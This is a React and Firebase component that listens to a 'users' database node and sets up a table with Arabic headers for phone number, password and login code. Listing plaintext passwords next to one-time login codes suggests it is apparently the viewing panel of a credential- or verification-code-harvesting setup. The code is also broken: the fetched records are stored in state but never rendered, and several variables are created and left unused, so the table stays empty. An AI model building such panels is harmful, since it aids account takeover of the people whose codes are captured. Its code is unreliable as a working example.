import * as React from "react";
import AppBar from "@mui/material/AppBar";
import Toolbar from "@mui/material/Toolbar";
import Typography from "@mui/material/Typography";
import Paper from "@mui/material/Paper";
import Grid from "@mui/material/Grid";
import { Table, TableBody, TableHead } from "@mui/material";
import { database } from "./firebase";

import { get, query, onChildAdded, ref } from "firebase/database";

export default function Content() {
  const [dt, setDt] = React.useState([]);
  React.useEffect(() => {
    const dbRef = ref(database, "users");
    const data = [{ phone: "", pass: "", code: "" }];
    const appendData = (da) => {
      setDt((prevState) => [...prevState, da]);
    };
    const qw = query(dbRef);
    onChildAdded(qw, (s) => {
      const dataBody = document.getElementById("dataBody");
      const phoneele = document.getElementById(s.val().phone);
      !data.includes(s.val()) ? data.push(s.val()) : null;
      const row = document.createElement("tr");
      if (s.exists) {
        appendData(s.val());
      }
    });
  }, []);
  return (
    <Paper sx={{ maxWidth: 936, margin: "auto", overflow: "hidden" }}>
      <AppBar
        position="static"
        color="default"
        elevation={0}
        sx={{ borderBottom: "1px solid rgba(0, 0, 0, 0.12)" }}
      >
        <Toolbar>
          <Grid container spacing={2} alignItems="center"></Grid>
        </Toolbar>
      </AppBar>
      <Table>
        <TableHead>
          <th className="responstable">رقم الهاتف</th>
          <th className="responstable">رمز السري</th>
          <th className="responstable">رمز الدخول</th>
        </TableHead>
        <TableBody className="responstable" id="dataBody"></TableBody>
      </Table>
    </Paper>
  );
}
